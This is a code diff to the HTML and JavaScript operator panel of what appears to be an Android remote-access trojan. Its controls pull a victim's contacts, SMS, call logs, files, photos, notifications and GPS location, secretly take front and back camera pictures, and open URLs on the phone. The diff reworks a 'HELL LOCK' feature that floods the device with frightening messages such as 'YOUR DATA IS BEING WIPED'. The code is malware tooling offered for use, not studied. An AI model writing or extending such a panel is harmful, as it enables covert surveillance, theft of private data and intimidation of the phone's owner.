@@ -26,11 +26,9 @@
         table { width:100%; border-collapse:collapse; }
         th { color:var(--primary); border-bottom:1px solid #333; padding:8px; text-align:left; }
         td { padding:8px; border-bottom:1px solid #1a2525; color:#ccc; }
-        input { background:#1e2e2e; border:1px solid #3b5e5e; padding:8px 15px; border-radius:20px; color:#fff; width:100%; }
+        input, textarea { background:#1e2e2e; border:1px solid #3b5e5e; padding:12px 15px; border-radius:15px; color:#fff; width:100%; }
         button { background:var(--primary); color:#000; font-weight:bold; border:none; padding:8px 15px; border-radius:20px; cursor:pointer; }
         .red-btn { background:var(--secondary); color:#fff; }
-        .gal-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(120px, 1fr)); gap:10px; }
-        .gal-item img { width:100%; height:100px; object-fit:cover; border-radius:10px; border:1px solid var(--primary); }
         @media (max-width:700px) { .app-container { grid-template-columns:1fr; } }
     </style>
 </head>
@@ -94,14 +92,10 @@
                 b.innerHTML = `
                     <p style="margin-bottom:5px;">Duration (Seconds):</p>
                     <input type="number" id="psec" value="30" style="margin-bottom:15px;">
-                    <p style="margin-bottom:5px;">Chaos Messages:</p>
-                    <div id="p-msgs">
-                        <input class="p-msg" value="YOU ARE HACKED!" style="margin-bottom:5px;">
-                        <input class="p-msg" value="SYSTEM FAILURE" style="margin-bottom:5px;">
-                    </div>
-                    <button onclick="addPMsg()" style="background:#222; color:var(--primary); margin-top:5px; width:100%">+ ADD MESSAGE</button>
+                    <p style="margin-bottom:5px;">Scary Message (Multiline supported):</p>
+                    <textarea id="pmsg" style="height:150px;">SYSTEM CRITICAL ERROR!\nUNAUTHORIZED ACCESS DETECTED\nYOUR DATA IS BEING WIPED...</textarea>
                 `;
-                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE PANIC MODE</button><button onclick="cmd('stop_panic')">STOP</button>`;
+                f.innerHTML = `<button class="red-btn" style="width:100%" onclick="startPanic()">🔥 ACTIVATE HELL LOCK</button><button onclick="cmd('stop_panic')">STOP</button>`;
                 return;
             }
 
@@ -110,19 +104,10 @@
             render();
         }
 
-        function addPMsg() {
-            const div = document.getElementById('p-msgs');
-            const inp = document.createElement('input');
-            inp.className = 'p-msg';
-            inp.style.marginBottom = '5px';
-            inp.placeholder = 'Next scary message...';
-            div.appendChild(inp);
-        }
-
         function startPanic() {
             const sec = document.getElementById('psec').value;
-            const msgs = Array.from(document.querySelectorAll('.p-msg')).map(i => i.value).filter(v => v);
-            cmd('panic ' + sec + '|' + msgs.join('|'));
+            const msg = document.getElementById('pmsg').value.replace(/\n/g, '<br>');
+            cmd('panic ' + sec + '|' + msg);
         }
 
         function closeModal() {
@@ -133,7 +118,6 @@
 
         function render() {
             if(!curMod || !selId || !cache[selId]) return;
-            // Prevent clearing for manual input modes
             if(['panic', 'vibrate', 'open_url'].includes(curMod)) return;
 
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
@@ -161,7 +145,8 @@
                     </div>
                 </div>`;
             } else if(curMod === 'contacts') {
-                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                const contacts = d.contacts || [];
+                b.innerHTML = `<table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
             } else if(curMod === 'filemanager') {
                 const fm = d.fm;
                 b.innerHTML = `<div style="background:#0a1212; padding:8px; border-radius:10px; font-family:monospace; font-size:0.75rem; color:var(--primary); margin-bottom:10px;">📂 ${fm.path}</div>
@@ -204,14 +189,14 @@
             document.getElementById('conn-stat').style.color = e ? "#00ffc3":"#ff3b9e";
             
             const btns = [
-                {id:'panic', i:'fa-triangle-exclamation', l:'PANIC TRIGGER'}, {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'},
+                {id:'panic', i:'fa-triangle-exclamation', l:'HELL LOCK'}, {id:'vibrate', i:'fa-mobile-vibration', l:'VIBRATE'},
                 {id:'info', i:'fa-circle-info', l:'INFO'}, {id:'contacts', i:'fa-address-book', l:'CONTACTS'},
                 {id:'sms', i:'fa-sms', l:'SMS'}, {id:'calls', i:'fa-phone', l:'CALLS'},
                 {id:'filemanager', i:'fa-folder', l:'FILES'}, {id:'gallery', i:'fa-images', l:'GALLERY'},
                 {id:'notifications', i:'fa-bell', l:'NOTIFS'}, {id:'apps', i:'fa-th', l:'APPS'},
                 {id:'get_location', i:'fa-map-marker-alt', l:'GPS'}, {id:'flash', i:'fa-bolt', l:'FLASH'},
                 {id:'takebackpic', i:'fa-camera', l:'CAM BACK'}, {id:'takefrontpic', i:'fa-video', l:'CAM FRONT'},
-                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'LOCK/MSG'},
+                {id:'setwallpaper', i:'fa-image', l:'WALLPAPER'}, {id:'toast', i:'fa-lock', l:'SYSTEM LOCK'},
                 {id:'open_url', i:'fa-globe', l:'OPEN URL'}
             ];
             document.getElementById('main-grid').innerHTML = btns.map(b=>`<div class="btn" onclick="${b.id==='flash'?'flash=!flash; cmd(flash?\'flashon\':\'flashoff\')':'openModal(\''+b.id+'\')'}"><i class="fas ${b.i}"></i>${b.l}</div>`).join('');
